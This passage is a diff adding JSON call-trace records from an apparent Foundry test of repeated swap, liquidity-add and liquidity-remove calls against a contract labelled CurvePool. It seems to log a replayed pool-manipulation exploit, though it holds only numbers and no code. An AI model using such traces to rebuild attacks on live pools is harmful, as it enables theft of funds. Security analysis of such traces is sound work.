+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2597907809324402345360081 [2.597e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "557248562874764001063883 [5.572e23]"
+    },
+    {
+        "id": "2981",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1153689794217360431181596 [1.153e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "6900375708001485732531 [6.9e21]"
+    },
+    {
+        "id": "106684",
+        "args": "6900375708001485732531 [6.9e21], 0, 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000030a07283b207759511"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "557248562874764001063883 [5.572e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6900375708001485732531 [6.9e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "930",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3751597603541762776541677 [3.751e24]"
+    },
+    {
+        "id": "128379",
+        "args": "1, 0, 3751597603541762776541677 [3.751e24], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "604788212128946210431 [6.047e20]"
+    },
+    {
+        "id": "3442",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CurvePool: [0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511], 3751597603541762776541677 [3.751e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "108518",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "15379436472736212574281 [1.537e22]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 15379436472736212574281 [1.537e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "565727623639498727905633 [5.657e23]"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "15379436472736212574281 [1.537e22]"
+    },
+    {
+        "id": "302933",
+        "args": "15379436472736212574281 [1.537e22], [0, 0], true",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "565727623639498727905633 [5.657e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 15379436472736212574281 [1.537e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "264073",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "108518",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "7267765615964473693004 [7.267e21]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7267765615964473693004 [7.267e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "557615952782726989024356 [5.576e23]"
+    },
+    {
+        "id": "137913",
+        "args": "0, 1, 500000000000000000000 [5e20], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "2886186401740110635985941 [2.886e24]"
+    },
+    {
+        "id": "25681",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2886186401740110635985941 [2.886e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "557615952782726989024356 [5.576e23]"
+    },
+    {
+        "id": "2981",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1288087790954905915251375 [1.288e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "7267765615964473693004 [7.267e21]"
+    },
+    {
+        "id": "106694",
+        "args": "7267765615964473693004 [7.267e21], 0, 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000030a08e0a721cadc754"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "557615952782726989024356 [5.576e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7267765615964473693004 [7.267e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "930",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "4174274192695016551237316 [4.174e24]"
+    },
+    {
+        "id": "128379",
+        "args": "1, 0, 4174274192695016551237316 [4.174e24], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "600563932942190591465 [6.005e20]"
+    },
+    {
+        "id": "3442",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CurvePool: [0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511], 4174274192695016551237316 [4.174e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "108528",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "16295586233461947286013 [1.629e22]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 16295586233461947286013 [1.629e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "566643773400224462617365 [5.666e23]"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "16295586233461947286013 [1.629e22]"
+    },
+    {
+        "id": "308317",
+        "args": "16295586233461947286013 [1.629e22], [0, 0], true",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "566643773400224462617365 [5.666e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 16295586233461947286013 [1.629e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "269457",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "108528",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "7672103142511546439782 [7.672e21]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7672103142511546439782 [7.672e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "558020290309274061771134 [5.58e23]"
+    },
+    {
+        "id": "143287",
+        "args": "0, 1, 500000000000000000000 [5e20], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "3221374417757598928680015 [3.221e24]"
+    },
+    {
+        "id": "25681",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3221374417757598928680015 [3.221e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "558020290309274061771134 [5.58e23]"
+    },
+    {
+        "id": "2981",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1445613443022395533132048 [1.445e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "7672103142511546439782 [7.672e21]"
+    },
+    {
+        "id": "106694",
+        "args": "7672103142511546439782 [7.672e21], 0, 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000030a0ad6258bf1b7d61"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "558020290309274061771134 [5.58e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7672103142511546439782 [7.672e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "930",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "4666987860779994461812063 [4.666e24]"
+    },
+    {
+        "id": "128796",
+        "args": "1, 0, 4666987860779994461812063 [4.666e24], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "595968569595561828178 [5.959e20]"
+    },
+    {
+        "id": "3442",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CurvePool: [0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511], 4666987860779994461812063 [4.666e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "108945",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "17315218570825585347065 [1.731e22]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 17315218570825585347065 [1.731e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "567663405737588100678417 [5.676e23]"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "17315218570825585347065 [1.731e22]"
+    },
+    {
+        "id": "308327",
+        "args": "17315218570825585347065 [1.731e22], [0, 0], true",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "567663405737588100678417 [5.676e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 17315218570825585347065 [1.731e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "269467",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "108528",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "8118756699479956919954 [8.118e21]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 8118756699479956919954 [8.118e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "558466943866242472251306 [5.584e23]"
+    },
+    {
+        "id": "143297",
+        "args": "0, 1, 500000000000000000000 [5e20], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "3613615964296194997540592 [3.613e24]"
+    },
+    {
+        "id": "25681",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3613615964296194997540592 [3.613e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "558466943866242472251306 [5.584e23]"
+    },
+    {
+        "id": "2981",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1631568303342183289608515 [1.631e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "8118756699479956919954 [8.118e21]"
+    },
+    {
+        "id": "106684",
+        "args": "8118756699479956919954 [8.118e21], 0, 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000030a0d0a9dc4ca6a140"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "558466943866242472251306 [5.584e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 8118756699479956919954 [8.118e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "930",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "5245184267638378287149107 [5.245e24]"
+    },
+    {
+        "id": "128796",
+        "args": "1, 0, 5245184267638378287149107 [5.245e24], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "590958421512665169259 [5.909e20]"
+    },
+    {
+        "id": "3442",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CurvePool: [0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511], 5245184267638378287149107 [5.245e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "108945",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "18455548807286535446261 [1.845e22]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18455548807286535446261 [1.845e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "568803735974049050777613 [5.688e23]"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "18455548807286535446261 [1.845e22]"
+    },
+    {
+        "id": "308744",
+        "args": "18455548807286535446261 [1.845e22], [0, 0], true",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "568803735974049050777613 [5.688e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18455548807286535446261 [1.845e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "269884",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "108945",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "8614098094265028924417 [8.614e21]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 8614098094265028924417 [8.614e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "558962285261027544255769 [5.589e23]"
+    },
+    {
+        "id": "143297",
+        "args": "0, 1, 500000000000000000000 [5e20], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "4075782274079207223792295 [4.075e24]"
+    },
+    {
+        "id": "25681",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4075782274079207223792295 [4.075e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "558962285261027544255769 [5.589e23]"
+    },
+    {
+        "id": "2981",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1852780603899945141676888 [1.852e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "8614098094265028924417 [8.614e21]"
+    },
+    {
+        "id": "106684",
+        "args": "8614098094265028924417 [8.614e21], 0, 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000030a0f837ece1d4f47e"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "558962285261027544255769 [5.589e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 8614098094265028924417 [8.614e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "930",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "5928562877979152365469183 [5.928e24]"
+    },
+    {
+        "id": "134104",
+        "args": "1, 0, 5928562877979152365469183 [5.928e24], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "585482602544438998648 [5.854e20]"
+    },
+    {
+        "id": "3442",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CurvePool: [0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511], 5928562877979152365469183 [5.928e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "111660",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "19737545248924001823318 [1.973e22]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 19737545248924001823318 [1.973e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "570085732415686517154670 [5.7e23]"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "19737545248924001823318 [1.973e22]"
+    },
+    {
+        "id": "309161",
+        "args": "19737545248924001823318 [1.973e22], [0, 0], true",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "570085732415686517154670 [5.7e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 19737545248924001823318 [1.973e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "270301",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "108945",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "9165726561175864536260 [9.165e21]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 9165726561175864536260 [9.165e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "559513913727938379867612 [5.595e23]"
+    },
+    {
+        "id": "143714",
+        "args": "0, 1, 500000000000000000000 [5e20], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "4624357145094686868911967 [4.624e24]"
+    },
+    {
+        "id": "25681",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4624357145094686868911967 [4.624e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "559513913727938379867612 [5.595e23]"
+    },
+    {
+        "id": "2981",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2118138260170218158145096 [2.118e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "9165726561175864536260 [9.165e21]"
+    },
+    {
+        "id": "106684",
+        "args": "9165726561175864536260 [9.165e21], 0, 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000030a1248fe6b8e88944"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "559513913727938379867612 [5.595e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 9165726561175864536260 [9.165e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
